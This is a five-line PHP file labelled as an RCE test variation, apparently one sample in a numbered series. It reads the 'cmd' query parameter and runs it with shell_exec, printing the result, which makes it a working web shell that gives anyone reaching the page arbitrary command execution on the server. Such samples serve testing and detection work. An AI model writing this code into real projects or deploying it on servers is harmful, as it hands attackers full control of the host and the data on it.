<?php
// RCE test variation #979
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>